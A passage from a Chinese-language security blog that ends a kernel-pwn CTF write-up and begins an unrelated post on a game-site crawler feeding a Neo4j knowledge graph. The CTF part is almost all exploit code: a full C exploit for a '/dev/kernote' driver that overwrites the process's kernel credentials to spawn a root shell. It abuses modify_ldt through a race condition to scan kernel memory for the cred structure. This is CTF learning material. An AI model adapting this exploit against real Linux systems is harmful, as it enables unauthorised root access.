class="string">&quot;save&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;root wrong&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;get root&quot;</span>);</span><br><span class="line">    setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notePut</span><span class="params">(<span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, PUT_NOTE, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteCreate</span><span class="params">(<span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, CREATE_NOTE, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteFree</span><span class="params">(<span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, FREE_NOTE, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteEdit</span><span class="params">(<span class="keyword">size_t</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, EDIT_NOTE, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span>               page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    <span class="keyword">size_t</span>               cred_addr = <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">size_t</span>               search_addr = <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">size_t</span>               *buf;</span><br><span class="line">    <span class="keyword">size_t</span>               *result_addr;</span><br><span class="line">    <span class="keyword">int</span>                  pipe_fd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span>                  retval;</span><br><span class="line">    <span class="keyword">int</span>                  cur_pid;</span><br><span class="line">    <span class="keyword">cpu_set_t</span>            cpu_set;</span><br><span class="line"></span><br><span class="line">    save_reg();</span><br><span class="line">    init_fd(<span class="string">&quot;/dev/kernote&quot;</span>);</span><br><span class="line"></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x8000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    noteCreate(<span class="number">0</span>);</span><br><span class="line">    notePut(<span class="number">0</span>);</span><br><span class="line">    noteFree(<span class="number">0</span>);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        noteEdit(page_offset_base);</span><br><span class="line">        retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;desc, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        page_offset_base += <span class="number">0x4000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    cur_pid = getpid();</span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;aaaaaaaa&quot;</span>);</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    buf = (<span class="keyword">size_t</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    search_addr = page_offset_base;</span><br><span class="line">    cred_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        noteEdit(search_addr);</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval)    </span><br><span class="line">        &#123;</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">            result_addr = (<span class="keyword">size_t</span>*) memmem(buf, <span class="number">0x8000</span>, <span class="string">&quot;aaaaaaaa&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span> (result_addr \</span><br><span class="line">                &amp;&amp; (result_addr[<span class="number">-2</span>] &gt; page_offset_base) \</span><br><span class="line">                &amp;&amp; (result_addr[<span class="number">-3</span>] &gt; page_offset_base) \</span><br><span class="line">                &amp;&amp; (((<span class="keyword">int</span>) result_addr[<span class="number">-58</span>]) == cur_pid))</span><br><span class="line">            &#123;</span><br><span class="line">                cred_addr = result_addr[<span class="number">-2</span>];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;found cred_addr: 0x%lx\n&quot;</span>, cred_addr);</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (cred_addr)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    retval = fork();</span><br><span class="line">    <span class="keyword">if</span> (!retval) <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval) <span class="comment">// child&#x27;s child</span></span><br><span class="line">        &#123;</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">            sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">                noteCreate(i);</span><br><span class="line">            notePut(<span class="number">11</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">                noteFree(i);</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">1</span>, &amp;cpu_set);</span><br><span class="line">            sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">                noteEdit(cred_addr + <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">        sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">        desc.base_addr = <span class="number">0</span>;</span><br><span class="line">        desc.entry_number = <span class="number">2</span>;</span><br><span class="line">        desc.limit = <span class="number">0</span>;</span><br><span class="line">        desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">        desc.contents = <span class="number">0</span>;</span><br><span class="line">        desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">        desc.lm = <span class="number">0</span>;</span><br><span class="line">        desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">        desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">        desc.useable = <span class="number">0</span>;</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">        sleep(<span class="number">10000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">    get_root();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>感谢 arttnba3 大佬的博客：<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#二、漏洞利用-1">TCTF2021-FINAL 两道 kernel pwn 题解 - arttnba3’s blog</a> </p>
<p>学习到了 <code>ldt_struct + modify_ldt</code> 通过条件竞争进行的 WAA（虽然成功率有点低）</p>
<p>通过调试已经基本掌握了 <code>seq_operations + pt_regs</code> 这种利用手法</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/01/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/01/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%80/" class="post-title-link" itemprop="url">知识图谱实践项目一</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-01 01:00:44" itemprop="dateCreated datePublished" datetime="2023-03-01T01:00:44+08:00">2023-03-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-03 10:53:56" itemprop="dateModified" datetime="2023-03-03T10:53:56+08:00">2023-03-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge-Graph/" itemprop="url" rel="index"><span itemprop="name">Knowledge Graph</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="知识图谱实践项目一"><a href="#知识图谱实践项目一" class="headerlink" title="知识图谱实践项目一"></a>知识图谱实践项目一</h2><p>这几天都在学习知识图谱的相关技术</p>
<p>本篇博客先简述知识图谱的相关知识，然后分析一个我自己写的 Demo</p>
<h2 id="知识图谱基础知识"><a href="#知识图谱基础知识" class="headerlink" title="知识图谱基础知识"></a>知识图谱基础知识</h2><p>知识图谱是一种结构化的知识表示方法，相比于文本更易于被机器查询和处理</p>
<p>知识图谱的构建是一个浩大的工程，从大方面来讲，分为 <strong>知识获取、知识融合、知识验证、知识计算和应用</strong> 几个部分 </p>
<p><strong>数据支持层</strong>：选什么样的数据库以及怎么设计 schema（模式）</p>
<ul>
<li>关系数据库</li>
<li>NoSQL 数据库</li>
<li>内存数据库</li>
<li>mongo 数据库（一种分布式数据库）</li>
<li>图数据库（Neo4J）</li>
</ul>
<p><strong>知识抽取层</strong>：对不同种类的数据用不同的技术提取</p>
<ul>
<li>从结构化数据库中获取知识：D2R</li>
<li>从链接数据中获取知识：图映射</li>
<li>从半结构化（网站）数据中获取知识：使用包装器</li>
<li>从纯文本中获取知识：信息抽取（包括：<strong>实体识别、实体链接、实体关系识别、概念抽取</strong>）</li>
</ul>
<p><strong>知识融合层</strong>：将不同数据源获取的知识进行融合构建数据之间的关联</p>
<ul>
<li>实体对齐</li>
<li>属性对齐</li>
<li>冲突消解</li>
<li>规范化</li>
</ul>
<p><strong>知识验证层</strong>：分为 <strong>补全、纠错、外链、更新</strong> 各部分，确保知识图谱的 <strong>一致性和准确性</strong> </p>
<p><strong>知识计算和应用</strong>：</p>
<ul>
<li><strong>本体或者规则推理</strong>：技术可以获取数据中存在的隐含知识</li>
<li><strong>链接预测</strong>：预测实体间隐含的关系</li>
<li><strong>社区计算</strong>：在知识网络上计算获取知识图谱上存在的社区，提供知识间关联的路径……</li>
<li><strong>知识计算知识图谱</strong>：可以产生大量的智能应用如专家系统、推荐系统、语义搜索、问答等</li>
</ul>
<h2 id="知识图谱项目"><a href="#知识图谱项目" class="headerlink" title="知识图谱项目"></a>知识图谱项目</h2><p>本项目就只有两个部分：</p>
<ul>
<li>爬虫（使用 <code>requests</code> 模块 + 正则表达式）</li>
<li>知识图谱（使用 Neo4J 数据库）</li>
</ul>
<p><strong>爬虫</strong></p>
<p>爬虫的目标网站为 <a target="_blank" rel="noopener" href="https://down.ali213.net/pcgame">https://down.ali213.net/pcgame</a></p>
<p>简单 F12 分析一下，然后直接正则匹配就好（我个人比较喜欢用 <code>.*?</code> 进行匹配）</p>
<img src="/2023/03/01/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%80/1677601340126.png" class width="1677601340126"> 
<ul>
<li>请求头的信息可以抓包查看</li>
</ul>
<p>有一个需要注意的点就是中文乱码问题，在 Python 使用如下代码来查看网页 html 的编码方式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">self</span>):</span></span><br><span class="line">    res = requests.get(self.target_url, headers)</span><br><span class="line">    <span class="built_in">print</span>(res.encoding)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISO<span class="number">-8859</span><span class="number">-1</span></span><br></pre></td></tr></table></figure>
<p>最后把爬取的信息存储在文件中</p>
<p>爬虫的代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin, urlencode</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crawler</span>:</span></span><br><span class="line">    target_url = <span class="string">&#x27;https://down.ali213.net/pcgame/all/0-0-0-0-new-pic-&#x27;</span></span><br><span class="line">    name = <span class="number">0</span></span><br><span class="line">    time = <span class="number">0</span></span><br><span class="line">    size = <span class="number">0</span></span><br><span class="line">    language = <span class="number">0</span></span><br><span class="line">    content = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_base_html</span>(<span class="params">self,get</span>):</span></span><br><span class="line">        <span class="keyword">if</span> get:</span><br><span class="line">            res = requests.get(self.base_url,headers)</span><br><span class="line">            text = res.text.encode(<span class="string">&#x27;iso-8859-1&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> text</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            text = <span class="built_in">open</span>(<span class="string">&#x27;base_html.txt&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>).read()</span><br><span class="line">            <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_list</span>(<span class="params">self</span>):</span></span><br><span class="line">        base_html = self.get_base_html(<span class="number">1</span>)</span><br><span class="line">        name_list = re.findall(<span class="string">&#x27;&lt;div class=&quot;game-name&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span>, base_html)</span><br><span class="line">        time_list = re.findall(<span class="string">&#x27;&lt;div&gt;时间：&lt;span&gt;(.*?)&lt;/span&gt;&#x27;</span>, base_html)</span><br><span class="line">        size_list = re.findall(<span class="string">&#x27;&lt;div&gt;大小：&lt;span&gt;(.*?)&lt;/span&gt;&#x27;</span>, base_html)</span><br><span class="line">        language_list = re.findall(<span class="string">&#x27;&lt;span class=&quot;game-lang&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>, base_html)</span><br><span class="line">        content_list = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> re.findall(<span class="string">&#x27;&lt;/div&gt;&lt;p&gt;(.*?)&lt;/p&gt;&lt;/div&gt;&#x27;</span>, base_html):</span><br><span class="line">            content_list.append(re.findall(<span class="string">&#x27;&lt;span&gt;(.*?)&lt;/span&gt;&#x27;</span>, i))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">zip</span>(name_list,time_list,size_list,language_list,content_list)):</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            self.name.write(<span class="built_in">str</span>(name_list[i]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.time.write(<span class="built_in">str</span>(time_list[i]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.size.write(<span class="built_in">str</span>(size_list[i]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.language.write(<span class="built_in">str</span>(language_list[i]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.content.write(<span class="built_in">str</span>(content_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.name = <span class="built_in">open</span>(<span class="string">&#x27;data/name.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.time = <span class="built_in">open</span>(<span class="string">&#x27;data/time.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.size = <span class="built_in">open</span>(<span class="string">&#x27;data/size.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.language = <span class="built_in">open</span>(<span class="string">&#x27;data/language.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.content = <span class="built_in">open</span>(<span class="string">&#x27;data/content.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">80</span>):</span><br><span class="line">            self.base_url = self.target_url+<span class="built_in">str</span>(i+<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now is &quot;</span>+self.base_url)</span><br><span class="line">            self.create_list()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">self</span>):</span></span><br><span class="line">        res = requests.get(self.target_url, headers)</span><br><span class="line">        <span class="built_in">print</span>(res.encoding)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cra = Crawler()</span><br><span class="line">    cra.run()</span><br></pre></td></tr></table></figure>
<p><strong>知识图谱</strong></p>
<p>我自己实现的知识图谱比较简单，其核心思想就是：读取爬取的数据，将其格式化为 Cypher 后发送给 Neo4j</p>
<ul>
<li>刚开始时不了解 Cypher 的语法，遇到了很多问题：<ul>
<li>匹配不到节点</li>
<li>删除重复节点</li>
<li>删除重复关系</li>
</ul>
</li>
<li>不过这些问题在网上都有解决的办法</li>
</ul>
<p>本知识图谱有两个主体 <code>游戏名称 游戏标签</code>，两者用 <code>分类</code> 关系进行连接</p>
<p>建立 <code>游戏名称</code> 节点时不用特殊处理，因为在爬虫爬取的过程中就不会有重复，但 <code>游戏标签</code> 中存在大量的重复，简单遍历后去重很影响效率，于是我就把 “建立节点” 和 “建立关系” 这两步给分开了：</p>
<ul>
<li>“建立关系” 的过程很依赖数据在文本中的位置（爬取时就从上往下存放数据）</li>
<li>先遍历文本并用列表记录 “存在的节点”，转化为 Cypher 后创建 <code>游戏标签</code> 节点</li>
<li>然后再次遍历该文本来 “建立关系”</li>
</ul>
<p>知识图谱的代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> py2neo <span class="keyword">import</span> Graph,Node,Relationship</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">classification = [<span class="string">&#x27;游戏名称&#x27;</span>,<span class="string">&#x27;游戏标签&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KG</span>:</span></span><br><span class="line">    name = <span class="built_in">open</span>(<span class="string">&#x27;data/name.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    time = <span class="built_in">open</span>(<span class="string">&#x27;data/time.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    size = <span class="built_in">open</span>(<span class="string">&#x27;data/size.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    language = <span class="built_in">open</span>(<span class="string">&#x27;data/language.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    content = <span class="built_in">open</span>(<span class="string">&#x27;data/content.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">createEntity</span>(<span class="params">self,graph</span>):</span></span><br><span class="line">        cql = <span class="string">&#x27;CREATE (n:游戏数据库&#123;id:\&#x27;0\&#x27;, name:\&#x27;游戏数据库\&#x27;&#125;) RETURN n&#x27;</span></span><br><span 